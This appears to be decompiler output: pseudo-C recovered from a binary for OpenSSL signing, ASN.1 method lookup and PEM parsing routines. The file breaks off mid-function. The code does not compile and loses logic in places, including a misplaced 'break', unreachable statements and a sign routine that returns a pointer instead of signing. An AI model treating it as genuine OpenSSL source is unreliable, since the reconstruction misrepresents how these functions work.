// Address range: 0x45d3a0 - 0x45d410
int64_t EVP_PKEY_verify_init(int64_t a1) {
    if (a1 == 0 || *(int64_t *)(a1 + 88) == 0) {
        // 0x45d3e8
        ERR_put_error(6, 143, 150, "pmeth_fn.c", 125);
        return 0xfffffffe;
    }
    // 0x45d3b8
    *(int32_t *)(a1 + 32) = 16;
    return 1;
}

// Address range: 0x45d410 - 0x45d480
int64_t EVP_PKEY_sign_init(int64_t a1) {
    if (a1 == 0 || *(int64_t *)(a1 + 72) == 0) {
        // 0x45d458
        ERR_put_error(6, 141, 150, "pmeth_fn.c", 88);
        return 0xfffffffe;
    }
    // 0x45d428
    *(int32_t *)(a1 + 32) = 8;
    return 1;
}

// Address range: 0x45d930 - 0x45da58
int64_t EVP_PKEY_sign(int64_t a1, int64_t a2, int64_t * a3, int64_t * a4, int64_t a5) {
    if (a1 == 0) {
        // 0x45da30
        ERR_put_error(6, 140, 150, "pmeth_fn.c", 107);
        // 0x45d9ac
        return 0xfffffffe;
    }
    int64_t result = *(int64_t *)(a1 + 72); // 0x45d94d
    if (result == 0) {
        // 0x45da30
        ERR_put_error(6, 140, 150, "pmeth_fn.c", 107);
        // 0x45d9ac
        return 0xfffffffe;
    }
    // 0x45d95a
    if (*(int32_t *)(a1 + 32) != 8) {
        // 0x45da00
        ERR_put_error(6, 140, 151, "pmeth_fn.c", 112);
        // 0x45d9ac
        return 0xffffffff;
    }
    // 0x45d964
    if ((*(char *)(a1 + 4) & 2) == 0) {
        // 0x45d9ac
        return result;
    }
    int64_t v1 = *(int64_t *)(a1 + 16); // 0x45d96a
    int64_t v2 = 0x100000000 * EVP_PKEY_size(v1) / 0x100000000; // 0x45d98b
    if (a2 == 0) {
        // 0x45d9f0
        *a3 = v2;
        // 0x45d9ac
        return 1;
    }
    int64_t result2; // 0x45d930
    if (v2 > (int64_t)a3) {
        // 0x45d9c0
        ERR_put_error(6, 140, 155, "pmeth_fn.c", 115);
        result2 = 0;
    } else {
        // 0x45d9a5
        result2 = *(int64_t *)(v1 + 72);
    }
    // 0x45d9ac
    return result2;
}

// Address range: 0x467ed0 - 0x467f0a
int64_t EVP_PKEY_asn1_free(int64_t a1) {
    // 0x467ed0
    if (a1 == 0 || (*(char *)(a1 + 8) & 2) == 0) {
        // 0x467f08
        int64_t result; // 0x467ed0
        return result;
    }
    int64_t v1 = *(int64_t *)(a1 + 16); // 0x467edf
    int64_t v2; // 0x467ed0
    if (v1 != 0) {
        // 0x467ee8
        CRYPTO_free(v1, v2);
    }
    int64_t v3 = *(int64_t *)(a1 + 24); // 0x467eed
    if (v3 != 0) {
        // 0x467ef6
        CRYPTO_free(v3, v2);
    }
    // 0x467efb
    return CRYPTO_free(a1, v2);
}

// Address range: 0x468170 - 0x4681a7
int64_t EVP_PKEY_asn1_get0(int64_t a1) {
    int32_t v1 = a1; // 0x468172
    if (v1 < 0) {
        // 0x468190
        return 0;
    }
    if (v1 > 10) {
        // 0x468198
        return sk_value(g274, a1 + 0xfffffff5 & 0xffffffff);
    }
    // 0x46817b
    return *(int64_t *)(0x100000000 * a1 / 0x20000000 + (int64_t)&g182);
}

// Address range: 0x4681b0 - 0x468292
int64_t EVP_PKEY_asn1_find(int64_t * a1, int64_t a2) {
    // 0x4681b0
    int64_t v1; // bp-264, 0x4681b0
    int64_t v2 = &v1; // 0x468200
    int64_t v3 = a2 & 0xffffffff; // 0x4681cf
    int64_t v4; // 0x4681b0
    int64_t result; // 0x4681b0
    int64_t v5; // 0x4681b0
    int64_t v6; // 0x4681b0
    int64_t v7; // 0x4681b0
    int64_t v8; // 0x4681b0
    int64_t v9; // 0x4681b0
    int64_t v10; // bp-48, 0x4681b0
    int64_t v11; // 0x4681b0
    while (true) {
      lab_0x4681f9:
        // 0x4681f9
        v11 = v3;
        v10 = v2;
        v1 = 0x100000000 * v11 / 0x100000000;
        if (g274 == 0) {
            goto lab_0x46821c;
        } else {
            int64_t v12 = v8;
            int64_t v13 = v6;
            int64_t v14 = sk_find(g274, (int32_t)v2, v12, v13); // 0x468213
            if ((int32_t)v14 >= 0) {
                int64_t v15 = sk_value(g274, v14 & 0xffffffff); // 0x4681e1
                v5 = v13;
                v7 = v12;
                v4 = v15;
                v9 = v12;
                result = 0;
                if (v15 == 0) {
                    // break -> 0x468249
                    break;
                }
                goto lab_0x4681ee;
            } else {
                goto lab_0x46821c;
            }
        }
    }
  lab_0x468249_3:
    // 0x468249
    if (a1 == NULL) {
        // 0x46826b
        return result;
    }
    int64_t v16 = ENGINE_get_pkey_asn1_meth_engine(v11); // 0x468250
    int64_t result2; // 0x4681b0
    if (v16 == 0) {
        // 0x468288
        *a1 = 0;
        result2 = result;
    } else {
        // 0x46825a
        *a1 = v16;
        result2 = ENGINE_get_pkey_asn1_meth(v16, v11, v9);
    }
    // 0x46826b
    return result2;
  lab_0x46821c:;
    // 0x46821c
    int64_t v17; // 0x4681b0
    int64_t v18 = OBJ_bsearch_(&v10, &g182, 11, 8, 0x467d00, v17); // 0x468237
    v9 = 11;
    result = 0;
    if (v18 == 0) {
        // break -> 0x468249
        goto lab_0x468249_3;
    }
    int64_t v19 = *(int64_t *)v18; // 0x468241
    v5 = 8;
    v7 = 11;
    v4 = v19;
    v9 = 11;
    result = v19;
    if (v19 == 0) {
        // break -> 0x468249
        goto lab_0x468249_3;
    }
    goto lab_0x4681ee;
  lab_0x4681ee:
    // 0x4681ee
    v9 = v7;
    result = v4;
    if (*(char *)(v4 + 8) % 2 == 0) {
        // break -> 0x468249
        goto lab_0x468249_3;
    }
    // 0x4681f5
    v6 = v5;
    v8 = v7;
    v3 = (int64_t)*(int32_t *)(v4 + 4);
    goto lab_0x4681f9;
}

// Address range: 0x4682a0 - 0x4682c2
int64_t EVP_PKEY_asn1_get_count(void) {
    int64_t result = 11; // 0x4682b3
    if (g274 != 0) {
        // 0x4682b5
        result = sk_num(g274) + 11 & 0xffffffff;
    }
    // 0x4682bd
    return result;
}

// Address range: 0x4682d0 - 0x4683d6
int64_t EVP_PKEY_asn1_find_str(int32_t a1, int64_t str, int64_t a3) {
    int64_t len = a3 & 0xffffffff; // 0x4682fe
    if ((int32_t)a3 == -1) {
        // 0x468370
        len = strlen((char *)str);
    }
    // 0x468300
    if (a1 != 0) {
        int64_t v1 = a1;
        int64_t v2; // bp-64, 0x4682d0
        int64_t v3 = ENGINE_pkey_asn1_find_str(&v2, str, len); // 0x468314
        if (v3 != 0) {
            int64_t result = (int32_t)ENGINE_init(v2) == 0 ? 0 : v3; // 0x468337
            ENGINE_free(v2);
            *(int64_t *)v1 = v2;
            // 0x468349
            return result;
        }
        // 0x468380
        *(int64_t *)v1 = 0;
    }
    // 0x468388
    if (EVP_PKEY_asn1_get_count() <= 0) {
        // 0x468349
        return 0;
    }
    int32_t n = len;
    int64_t v4 = 0; // 0x4683c3
    int64_t v5 = EVP_PKEY_asn1_get0(v4); // 0x468392
    char * str2; // 0x4683a7
    if (*(char *)(v5 + 8) % 2 == 0) {
        // 0x4683a0
        str2 = (char *)*(int64_t *)(v5 + 16);
        if (strlen(str2) == n) {
            // 0x4683b1
            if (strncasecmp(str2, (char *)str, n) == 0) {
                // break -> 0x468349
                break;
            }
        }
    }
    // 0x4683c3
    v4 = v4 + 1 & 0xffffffff;
    int64_t result2 = 0; // 0x4683cd
    while (v4 < EVP_PKEY_asn1_get_count()) {
        // 0x468390
        v5 = EVP_PKEY_asn1_get0(v4);
        if (*(char *)(v5 + 8) % 2 == 0) {
            // 0x4683a0
            str2 = (char *)*(int64_t *)(v5 + 16);
            if (strlen(str2) == n) {
                // 0x4683b1
                result2 = v5;
                if (strncasecmp(str2, (char *)str, n) == 0) {
                    // break -> 0x468349
                    break;
                }
            }
        }
        // 0x4683c3
        v4 = v4 + 1 & 0xffffffff;
        result2 = 0;
    }
    // 0x468349
    return result2;
}

// Address range: 0x46a910 - 0x46a984
int64_t pem_check_suffix(int64_t str, char * str2) {
    int32_t len = strlen((char *)str); // 0x46a929
    int32_t len2 = strlen(str2); // 0x46a933
    uint32_t v1 = len2 + 1; // 0x46a938
    if (len <= v1) {
        // 0x46a966
        return 0;
    }
    int64_t v2 = (int64_t)len - (int64_t)len2 + str; // 0x46a94a
    if ((int32_t)function_42e6b0(v2, (int64_t)str2, (int64_t)v1) != 0) {
        // 0x46a966
        return 0;
    }
    int64_t v3 = v2 - 1; // 0x46a95a
    int64_t result = 0; // 0x46a962
    if (*(char *)v3 == 32) {
        // 0x46a980
        result = v3 - str & 0xffffffff;
    }
    // 0x46a966
    return result;
}

// Address range: 0x46a990 - 0x46afa4
int64_t PEM_read_bio(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5) {
    int64_t v1 = __readfsqword(40); // 0x46a9b8
    int32_t v2 = 0; // bp-432, 0x46a9cb
    int64_t v3 = BUF_MEM_new(); // 0x46a9d3
    int64_t v4 = BUF_MEM_new(); // 0x46a9dd
    int64_t v5 = BUF_MEM_new(); // 0x46a9e5
    int64_t v6; // 0x46a990
    int64_t v7; // 0x46a990
    int64_t v8; // 0x46a990
    int64_t v9; // 0x46a990
    int64_t v10; // 0x46a990
    int64_t v11; // 0x46a990
    int64_t v12; // 0x46a990
    int64_t v13; // 0x46a990
    int64_t v14; // 0x46a990
    int64_t v15; // 0x46a990
    int64_t result; // 0x46a990
    int64_t v16; // 0x46a990
    int64_t v17; // 0x46a990
    int64_t v18; // 0x46a990
    int64_t v19; // 0x46a990
    int64_t v20; // 0x46a990
    int64_t v21; // 0x46a990
    int64_t str4; // bp-424, 0x46a990
    int32_t v22; // bp-504, 0x46a990
    int32_t v23; // 0x46a990
    int64_t v24; // 0x46aa86
    int64_t v25; // 0x46aaa8
    int64_t * v26; // 0x46aae2
    int64_t * v27; // 0x46ab14
    int64_t v28; // 0x46aa0b
    int64_t v29; // 0x46a990
    int64_t v30; // 0x46a990
    if (v4 == 0 || (int32_t)v3 == 0 || v5 == 0) {
        // 0x46ac32
        BUF_MEM_free(0x100000000 * v3 / 0x100000000, a2);
        BUF_MEM_free(v4, a2);
        BUF_MEM_free(v5, a2);
        ERR_put_error(9, 109, 65, "pem_lib.c", 692);
        result = 0;
        v17 = v4;
        v12 = v5;
        goto lab_0x46ac09;
    } else {
        // 0x46aa0b
        v28 = &str4;
        v29 = (int64_t)&v22 + 80;
        bool v31; // 0x46a990
        v30 = v31 ? -1 : 1;
        int64_t v32 = BIO_gets(a1, &str4, 254, a4, a5); // 0x46aa3b
        int64_t v33 = v32; // 0x46aa42
        int64_t v34 = a5; // 0x46aa42
        if ((int32_t)v32 >= 1) {
            while (true) {
                // 0x46aa50
                v14 = v34;
                v7 = v33;
                while (true) {
                  lab_0x46aa50:;
                    int64_t v35 = v7;
                    int64_t v36 = 0x100000000 * v35;
                    v6 = v36;
                    while (*(char *)(v36 / 0x100000000 + v29) <= 32) {
                        int32_t v37 = (int32_t)v35 - 1; // 0x46aa5a
                        int64_t v38 = v37; // 0x46aa5a
                        int64_t v39 = v38; // 0x46aa5d
                        if (v37 < 0) {
                            // 0x46aa5a
                            v6 = 0x100000000 * v38;
                            goto lab_0x46aa5f;
                        }
                        v35 = v39;
                        v36 = 0x100000000 * v35;
                        v6 = v36;
                    }
                    goto lab_0x46aa5f;
                }
              lab_0x46aa81:;
                // 0x46aa81
                int64_t str; // bp-413, 0x46a990
                int32_t len = strlen((char *)&str); // 0x46aa86
                v24 = len;
                int64_t v40 = 6; // 0x46aaa1
                int64_t v41 = (int64_t)"-----\n"; // 0x46aaa1
                int64_t v42; // 0x46ab07
                int64_t v43; // 0x46ab2b
                if (v40 == 0) {
                    // 0x46aaa5
                    v25 = 0x100000000 * v3 / 0x100000000;
                    v22 = len;
                    v18 = v4;
                    v15 = 718;
                    v13 = v5;
                    if ((int32_t)BUF_MEM_grow(v25, (0x100000000 * (int64_t)len + 0x900000000) / 0x100000000) == 0) {
                        goto lab_0x46ac77;
                    } else {
                        // 0x46aacd
                        v26 = (int64_t *)(v25 + 8);
                        memcpy((int64_t *)*v26, &str, v22 - 6);
                        *(char *)(v24 - 6 + *v26) = 0;
                        v42 = BUF_MEM_grow(v4, 256);
                        v18 = v4;
                        v15 = 728;
                        v13 = v5;
                        if ((int32_t)v42 == 0) {
                            goto lab_0x46ac77;
                        } else {
                            // 0x46ab14
                            v27 = (int64_t *)(v4 + 8);
                            *(char *)*v27 = 0;
                            v43 = BIO_gets(a1, &str4, 254, v25, v24);
                            v8 = v43;
                            v9 = 0;
                            v19 = v25;
                            v10 = 0;
                            v20 = v25;
                            v23 = 0;
                            if ((int32_t)v43 < 1) {
                                goto lab_0x46ac9a;
                            } else {
                                goto lab_0x46ab40;
                            }
                        }
                    }
                }
                int64_t v44 = (v28 | 5) + v24;
                char v45 = *(char *)v41; // 0x46aaa1
                int64_t v46 = v40 - 1; // 0x46aaa1
                v40 = v46;
                int64_t v47 = v44 + v30; // 0x46aaa1
                v41 += v30;
                while (*(char *)v44 == v45) {
                    if (v40 == 0) {
                        // 0x46aaa5
                        v25 = 0x100000000 * v3 / 0x100000000;
                        v22 = len;
                        v18 = v4;
                        v15 = 718;
                        v13 = v5;
                        if ((int32_t)BUF_MEM_grow(v25, (0x100000000 * (int64_t)len + 0x900000000) / 0x100000000) == 0) {
                            goto lab_0x46ac77;
                        } else {
                            // 0x46aacd
                            v26 = (int64_t *)(v25 + 8);
                            memcpy((int64_t *)*v26, &str, v22 - 6);
                            *(char *)(v24 - 6 + *v26) = 0;
                            v42 = BUF_MEM_grow(v4, 256);
                            v18 = v4;
                            v15 = 728;
                            v13 = v5;
                            if ((int32_t)v42 == 0) {
                                goto lab_0x46ac77;
                            } else {
                                // 0x46ab14
                                v27 = (int64_t *)(v4 + 8);
                                *(char *)*v27 = 0;
                                v43 = BIO_gets(a1, &str4, 254, v25, v24);
                                v8 = v43;
                                v9 = 0;
                                v19 = v25;
                                v10 = 0;
                                v20 = v25;
                                v23 = 0;
                                if ((int32_t)v43 < 1) {
                                    goto lab_0x46ac9a;
                                } else {
                                    goto lab_0x46ab40;
                                }
                            }
                        }
                    }
                    v44 = v47;
                    v45 = *(char *)v41;
                    v46 = v40 - 1;
                    v40 = v46;
                    v47 = v44 + v30;
                    v41 += v30;
                }
                int64_t v48 = BIO_gets(a1, &str4, 254, v46, v24); // 0x46aa3b
                v33 = v48;
                v34 = v24;
                if ((int32_t)v48 < 1) {
                    // break -> 0x46abcc
                    break;
                }
            }
        }
      lab_0x46abcc:
        // 0x46abcc
        ERR_put_error(9, 109, 108, "pem_lib.c", 703);
        v16 = v4;
        v21 = 109;
        v11 = v5;
        goto lab_0x46abed;
    }
  lab_0x46aa5f:
    // 0x46aa5f
    *(char *)((v6 + 0x100000000) / 0x100000000 + v29) = 10;
    *(char *)((v6 + 0x200000000) / 0x100000000 + v29) = 0;
    int64_t v49 = v28;
    int64_t v50 = (int64_t)"-----BEGIN ";
    int64_t v51 = 10; // 0x46aa7d
    while (*(char *)v49 == *(char *)v50) {
        int64_t v52 = v50 + v30; // 0x46aa7d
        int64_t v53 = v49 + v30; // 0x46aa7d
        int64_t v54 = v51; // 0x46aa7d
        if (v51 == 0) {
            // break (via goto) -> 0x46aa81
            goto lab_0x46aa81;
        }
        v49 = v53;
        v50 = v52;
        v51 = v54 - 1;
    }
    int64_t v55 = BIO_gets(a1, &str4, 254, v51, v14); // 0x46aa3b
    v7 = v55;
    if ((int32_t)v55 < 1) {
        // break (via goto) -> 0x46abcc
        goto lab_0x46abcc;
    }
    goto lab_0x46aa50;
  lab_0x46ac09:
    // 0x46ac09
    if (v1 == __readfsqword(40)) {
        // 0x46ac20
        return result;
    }
    // 0x46af4e
    __stack_chk_fail();
    v18 = v17;
    v15 = 771;
    v13 = v12;
    goto lab_0x46ac77;
  lab_0x46abed:
    // 0x46abed
    BUF_MEM_free(0x100000000 * v3 / 0x100000000, v21);
    BUF_MEM_free(v16, v21);
    BUF_MEM_free(v11, v21);
    result = 0;
    v17 = v16;
    v12 = v11;
    goto lab_0x46ac09;
  lab_0x46ac77:
    // 0x46ac77
    ERR_put_error(9, 109, 65, "pem_lib.c", v15);
    v16 = v18;
    v21 = 109;
    v11 = v13;
    goto lab_0x46abed;
  lab_0x46ac9a:
    // 0x46ac9a
    v2 = 0;
    int64_t v56 = BUF_MEM_grow(v5, 1024); // 0x46acaa
    v18 = v4;
    v15 = 753;
    v13 = v5;
    int64_t v57; // 0x46a990
    int64_t v58; // 0x46a990
    int64_t v59; // 0x46a990
    int64_t * v60; // 0x46acb9
    if ((int32_t)v56 == 0) {
        goto lab_0x46ac77;
    } else {
        // 0x46acb9
        v60 = (int64_t *)(v5 + 8);
        *(char *)*v60 = 0;
        v59 = v20;
        if (v23 != 0) {
            // 0x46af25
            v2 = v10;
            v58 = v5;
            v57 = v4;
            goto lab_0x46adc4;
        } else {
            goto lab_0x46acc9;
        }
    }
  lab_0x46ab40:;
    int64_t v61 = v9;
    int64_t v62 = v8; // 0x46a990
    goto lab_0x46ab40_2;
  lab_0x46ab40_2:;
    int64_t v63 = v62;
    int64_t v64 = 0x100000000 * v63;
    int64_t v65 = v64; // 0x46ab48
    int64_t v66 = v63; // 0x46ab48
    if (*(char *)(v64 / 0x100000000 + v29) > 32) {
        goto lab_0x46ab4f;
    } else {
        int32_t v67 = (int32_t)v63 - 1; // 0x46ab4a
        int64_t v68 = v67; // 0x46ab4a
        v62 = v68;
        if (v67 >= 0) {
            goto lab_0x46ab40_2;
        } else {
            // 0x46ab4a
            v65 = 0x100000000 * v68;
            v66 = v68;
            goto lab_0x46ab4f;
        }
    }
  lab_0x46acc9:;
    int64_t v69 = BIO_gets(a1, &str4, 254, v59, 753); // 0x46acd4
    int32_t v70 = v69; // 0x46acd9
    int64_t v71 = v69; // 0x46acdb
    v58 = v4;
    v57 = v5;
    if (v70 >= 0 == (v70 != 0)) {
        goto lab_0x46aced;
    } else {
        goto lab_0x46adc4;
    }
  lab_0x46ab4f:;
    int64_t v72 = v66 + 2; // 0x46ab52
    *(char *)((v65 + 0x100000000) / 0x100000000 + v29) = 10;
    int64_t v73 = 0x100000000 * v72 / 0x100000000; // 0x46ab5d
    *(char *)(v73 + v29) = 0;
    v10 = v61;
    v20 = v19;
    v23 = 0;
    int64_t v74; // 0x46a990
    int64_t v75; // 0x46a990
    int64_t v76; // 0x46a990
    int64_t v77; // 0x46ab70
    int64_t v78; // 0x46ab7b
    if ((char)str4 == 10) {
        goto lab_0x46ac9a;
    } else {
        int64_t v79 = (v72 & 0xffffffff) + v61; // 0x46ab70
        v77 = v79 & 0xffffffff;
        v22 = v73;
        v78 = 0x100000000 * v79;
        int64_t v80 = BUF_MEM_grow(v4, (v78 + 0x900000000) / 0x100000000); // 0x46ab82
        v75 = (int64_t)"-----END ";
        v76 = v28;
        v74 = 9;
        v18 = v4;
        v15 = 740;
        v13 = v5;
        if ((int32_t)v80 == 0) {
            goto lab_0x46ac77;
        } else {
            goto lab_0x46ab93;
        }
    }
  lab_0x46adc4:;
    int64_t v81 = *v26; // 0x46add9
    int64_t v82 = -1; // 0x46ade2
    int64_t v83 = v81; // 0x46ade2
    goto lab_dec_label_pc_unknown;
  lab_0x46aced:;
    int64_t v133 = v71;
    int64_t v134 = 0x100000000 * v133;
    int64_t v90 = v134; // 0x46acf5
    int64_t v88 = v133; // 0x46acf5
    if (*(char *)(v134 / 0x100000000 + v29) < 33) {
        int32_t v135 = (int32_t)v133 - 1; // 0x46ace8
        int64_t v136 = v135; // 0x46ace8
        v71 = v136;
        if (v135 < 0) {
            // 0x46acf7
            v90 = 0x100000000 * v136;
            v88 = v136;
            goto lab_0x46acf7;
        } else {
            goto lab_0x46aced;
        }
    } else {
        goto lab_0x46acf7;
    }
  lab_dec_label_pc_unknown:;
    int64_t v84 = 0; // 0x46ade2
    if (v82 == 0) {
        goto lab_dec_label_pc_unknown_2;
    } else {
        int64_t v85 = v83;
        int64_t v86 = v82 - 1; // 0x46ade2
        v82 = v86;
        v83 = v85 + v30;
        v84 = v86;
        if (*(char *)v85 == 0) {
            goto lab_dec_label_pc_unknown_2;
        } else {
            goto lab_dec_label_pc_unknown;
        }
    }
  lab_0x46acf7:;
    int64_t v87 = v88 + 2; // 0x46acfa
    int64_t v89 = 0x100000000 * v87 / 0x100000000; // 0x46ad10
    *(char *)((v90 + 0x100000000) / 0x100000000 + v29) = 10;
    *(char *)(v89 + v29) = 0;
    int64_t v91 = (int64_t)"-----END "; // 0x46a990
    int64_t v92 = v28; // 0x46a990
    int64_t v93 = 9; // 0x46a990
    goto lab_dec_label_pc_unknown_4;
  lab_0x46ab93:;
    int64_t v128 = v76;
    int64_t v129 = v75;
    int64_t v130 = v74 - 1; // 0x46aba2
    if (*(char *)v128 == *(char *)v129) {
        // 0x46ab93
        v75 = v129 + v30;
        v76 = v128 + v30;
        v74 = v130;
        v10 = v61;
        v20 = 0;
        v23 = 1;
        if (v130 == 0) {
            goto lab_0x46ac9a;
        } else {
            goto lab_0x46ab93;
        }
    } else {
        int64_t v131 = *v27; // 0x46abad
        memcpy((int64_t *)(v131 + 0x100000000 * v61 / 0x100000000), &str4, v22);
        *(char *)(*v27 + v78 / 0x100000000) = 0;
        int64_t v132 = BIO_gets(a1, &str4, 254, v130, v24); // 0x46ab2b
        v8 = v132;
        v9 = v77;
        v19 = v130;
        v10 = v77;
        v20 = v130;
        v23 = 0;
        if ((int32_t)v132 < 1) {
            goto lab_0x46ac9a;
        } else {
            goto lab_0x46ab40;
        }
    }
  lab_dec_label_pc_unknown_2:;
    int32_t strncmp_rc2 = strncmp((char *)&str4, "-----END ", 9); // 0x46adee
    int64_t str2 = v81; // 0x46adf5
    int64_t v109 = v58; // 0x46adf5
    int64_t v108 = -2 - v84; // 0x46adf5
    int64_t v110 = v57; // 0x46adf5
    int64_t v102 = v58; // 0x46adf5
    int64_t v103 = v57; // 0x46adf5
    if (strncmp_rc2 != 0) {
        goto lab_0x46aef4;
    } else {
        goto lab_0x46adfb;
    }
  lab_dec_label_pc_unknown_4:;
    int64_t v94 = v92;
    int64_t v95 = v91;
    int64_t v96 = v93 - 1; // 0x46ad1e
    int64_t v97; // 0x46a990
    int64_t v98; // 0x46a990
    int64_t v99; // 0x46a990
    int64_t v100; // 0x46af69
    if (*(char *)v94 == *(char *)v95) {
        v91 = v95 + v30;
        v92 = v94 + v30;
        v93 = v96;
        if (v96 == 0) {
            // 0x46af5e
            v100 = *v26;
            v98 = -1;
            v99 = v100;
            goto lab_dec_label_pc_unknown_5;
        } else {
            goto lab_dec_label_pc_unknown_4;
        }
    } else {
        int32_t v101 = v87; // 0x46ad2a
        v102 = v4;
        v103 = v5;
        if (v101 > 65) {
            goto lab_0x46aef4;
        } else {
            int64_t v104 = BUF_MEM_grow_clean(v5, (int64_t)(v101 + 9 + v2)); // 0x46ad3f
            v18 = v4;
            v15 = 771;
            v13 = v5;
            if ((int32_t)v104 == 0) {
                goto lab_0x46ac77;
            } else {
                int64_t v105 = *v60; // 0x46ad57
                memcpy((int64_t *)(v105 + (int64_t)v2), &str4, (int32_t)v89);
                *(char *)(*v60 + (int64_t)(v2 + v101)) = 0;
                v2 += v101;
                v59 = v96;
                if (v101 == 65) {
                    goto lab_0x46acc9;
                } else {
                    // 0x46ad80
                    str4 = 0;
                    int64_t v106 = BIO_gets(a1, &str4, 254, v96, 753); // 0x46ad90
                    int32_t v107 = v106; // 0x46ad95
                    v97 = v106;
                    v58 = v4;
                    v57 = v5;
                    if (v107 >= 0 == (v107 != 0)) {
                        goto lab_0x46ada5;
                    } else {
                        goto lab_0x46adc4;
                    }
                }
            }
        }
    }
  lab_0x46aef4:
    // 0x46aef4
    ERR_put_error(9, 109, 102, "pem_lib.c", 802);
    v16 = v102;
    v21 = 109;
    v11 = v103;
    goto lab_0x46abed;
  lab_0x46adfb:;
    int64_t n = 0x100000000 * v108 / 0x100000000; // 0x46adfb
    int64_t str3; // bp-415, 0x46a990
    int32_t strncmp_rc = strncmp((char *)str2, (char *)&str3, (int32_t)n); // 0x46ae09
    v102 = v109;
    v103 = v110;
    int64_t v111; // 0x46a990
    if (strncmp_rc != 0) {
        goto lab_0x46aef4;
    } else {
        // 0x46ae16
        v102 = v109;
        v103 = v110;
        if (strncmp((char *)(v28 + 9 + n), "-----\n", 6) != 0) {
            goto lab_0x46aef4;
        } else {
            // 0x46ae34
            int64_t v112; // bp-168, 0x46a990
            EVP_DecodeInit(&v112);
            int64_t * v113 = (int64_t *)(v110 + 8); // 0x46ae44
            int64_t v114 = *v113; // 0x46ae44
            int64_t v115; // 0x46a990
            int64_t v116 = EVP_DecodeUpdate(&v112, v114, &v2, v114, v2, v115, (int64_t)&g299, (int64_t)&g299, (int64_t)&g299, (int64_t)&g299, (int64_t)&g299, (int64_t)&g299); // 0x46ae58
            v111 = 812;
            if ((int32_t)v116 < 0) {
                goto lab_0x46af84;
            } else {
                int64_t v117 = *v113 + (int64_t)v2; // 0x46ae78
                int32_t v118; // bp-428, 0x46a990
                int64_t v119 = EVP_DecodeFinal(&v112, v117, (int64_t *)&v118); // 0x46ae7c
                v111 = 818;
                if ((int32_t)v119 < 0) {
                    goto lab_0x46af84;
                } else {
                    int32_t v120 = v2 + v118; // 0x46ae8d
                    v2 = v120;
                    v16 = v109;
                    v21 = v117;
                    v11 = v110;
                    if (v120 == 0) {
                        goto lab_0x46abed;
                    } else {
                        // 0x46ae9d
                        *(int64_t *)a2 = *v26;
                        *(int64_t *)a3 = *(int64_t *)(v109 + 8);
                        *(int64_t *)a4 = *v113;
                        *(int64_t *)a5 = (int64_t)v120;
                        CRYPTO_free(v25, v117);
                        CRYPTO_free(v109, v117);
                        CRYPTO_free(v110, v117);
                        result = 1;
                        v17 = v109;
                        v12 = v110;
                        goto lab_0x46ac09;
                    }
                }
            }
        }
    }
  lab_dec_label_pc_unknown_5:;
    int64_t v121 = 0; // 0x46af70
    if (v98 == 0) {
        goto lab_dec_label_pc_unknown_6;
    } else {
        int64_t v122 = v99;
        int64_t v123 = v98 - 1; // 0x46af70
        v98 = v123;
        v99 = v122 + v30;
        v121 = v123;
        if (*(char *)v122 == 0) {
            goto lab_dec_label_pc_unknown_6;
        } else {
            goto lab_dec_label_pc_unknown_5;
        }
    }
  lab_0x46af84:
    // 0x46af84
    ERR_put_error(9, 109, 100, "pem_lib.c", v111);
    v16 = v109;
    v21 = 109;
    v11 = v110;
    goto lab_0x46abed;
  lab_dec_label_pc_unknown_6:
    str2 = v100;
    v109 = v4;
    v108 = 0xfffffffe - v121 & 0xffffffff;
    v110 = v5;
    goto lab_0x46adfb;
  lab_0x46ada5:;
    int64_t v124 = 0x100000000 * v97;
    int64_t v125 = v124; // 0x46adad
    if (*(char *)(v124 / 0x100000000 + v29) < 33) {
        int32_t v126 = (int32_t)v97 - 1; // 0x46ada0
        int64_t v127 = v126; // 0x46ada0
        v97 = v127;
        if (v126 < 0) {
            // 0x46ada0
            v125 = 0x100000000 * v127;
            goto lab_0x46adaf;
        } else {
            goto lab_0x46ada5;
        }
    } else {
        goto lab_0x46adaf;
    }
  lab_0x46adaf:
    // 0x46adaf
    *(char *)((v125 + 0x100000000) / 0x100000000 + v29) = 10;
    *(char *)((v125 + 0x200000000) / 0x100000000 + v29) = 0;
    v58 = v4;
    v57 = v5;
    goto lab_0x46adc4;
}

// Address range: 0x46b4c0 - 0x46b779
int64_t PEM_get_EVP_CIPHER_INFO(int64_t a1, int64_t * a2) {
    // 0x46b4c0
    *a2 = 0;
    if (a1 == 0) {
        // 0x46b51d
        return 1;
    }
    int64_t result = 1; // 0x46b4c0
    int64_t v1; // 0x46b4c0
    int64_t v2; // 0x46b4c0
    int64_t v3; // 0x46b4c0
    int64_t v4; // 0x46b4c0
    int64_t v5; // 0x46b536
    int64_t v6; // 0x46b4c0
    int64_t v7; // 0x46b4c0
    switch ((char)v4) {
        case 0: {
            return result;
        }
        case 10: {
            return result;
        }
        default: {
            // 0x46b4f1
            v6 = (int64_t)a2;
            bool v8; // 0x46b4c0
            v7 = v8 ? -1 : 1;
            int64_t v9 = (int64_t)"Proc-Type: "; // 0x46b4c0
            int64_t v10 = a1; // 0x46b4c0
            int64_t v11 = 11; // 0x46b500
            while (*(char *)v10 == *(char *)v9) {
                v11--;
                v9 += v7;
                v10 += v7;
                if (v11 == 0) {
                    // 0x46b508
                    result = 0;
                    if (*(char *)(a1 + 11) == 52) {
                        // 0x46b530
                        result = 0;
                        if (*(char *)(a1 + 12) != 44) {
                            return result;
                        } else {
                            // 0x46b536
                            v5 = a1 + 13;
                            v1 = (int64_t)"ENCRYPTED";
                            v2 = 9;
                            v3 = v5;
                            goto lab_dec_label_pc_unknown_8;
                        }
                    } else {
                        return result;
                    }
                }
            }
            // 0x46b5a8
            ERR_put_error(9, 107, 107, "pem_lib.c", 500);
            result = 0;
          lab_0x46b51d:
            // 0x46b51d
            return result;
        }
    }
  lab_dec_label_pc_unknown_8:;
    int64_t v12; // 0x46b4c0
    int64_t v13; // 0x46b4c0
    if (v2 == 0) {
        char v14 = *(char *)v5; // 0x46b551
        v13 = v5;
        if (v14 == 10) {
            goto lab_0x46b600;
        } else {
            // 0x46b55d
            v12 = v5;
            if (v14 != 0) {
                goto lab_0x46b570;
            } else {
                // 0x46b57b
                ERR_put_error(9, 107, 112, "pem_lib.c", 509);
                result = 0;
                return result;
            }
        }
    } else {
        int64_t v15 = v3;
        char v16 = *(char *)v1; // 0x46b549
        v1 += v7;
        v2--;
        v3 = v15 + v7;
        if (*(char *)v15 == v16) {
            goto lab_dec_label_pc_unknown_8;
        } else {
            // 0x46b5d0
            ERR_put_error(9, 107, 106, "pem_lib.c", 505);
            result = 0;
            return result;
        }
    }
  lab_0x46b600:;
